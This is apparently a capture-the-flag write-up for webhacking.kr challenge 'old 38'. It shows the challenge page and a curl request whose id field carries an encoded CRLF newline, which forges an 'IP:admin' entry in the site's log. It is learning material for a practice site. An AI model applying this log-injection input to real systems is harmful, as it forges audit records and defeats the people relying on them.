# Old 38    SQLi (Newline)

URL: [https://webhacking.kr/challenge/bonus-9/](https://webhacking.kr/challenge/bonus-9/)

![old-38-1.png](/assets/ctf/webhacking.kr/old-38-1.png)

```html
<html>
<head>
<title>Challenge 38</title>
</head>
<body>
<h1>LOG INJECTION</h1>
<form method=post action=index.php>
<input type=text name=id size=20>
<input type=submit value='Login'>
</form>
<!-- <a href=admin.php>admin page</a> -->
</body>
</html>
```

IMAGE

It seems like we are in an `INSERT` query.

The log wanted to see `IP:admin` and to make that happen `\r\n` -> `%0D%0A` is required to inject newline and then add our content:
```powershell
➜ curl "https://webhacking.kr/challenge/bonus-9/index.php" `
>   -H "Cookie: PHPSESSID=3052403292" `
>   -H "Referer: https://webhacking.kr/challenge/bonus-9/index.php" `
>   -d "id=test%0D%0A212.58.121.95:admin"
<html>
<head>
<title>Challenge 38</title>
</head>
<body>
<h1>LOG INJECTION</h1>
<form method=post action=index.php>
<input type=text name=id size=20>
<input type=submit value='Login'>
</form>
<!-- <a href=admin.php>admin page</a> -->
</body>
</html>
```

View logs:
![old-38-2.png](/assets/ctf/webhacking.kr/old-38-2.png)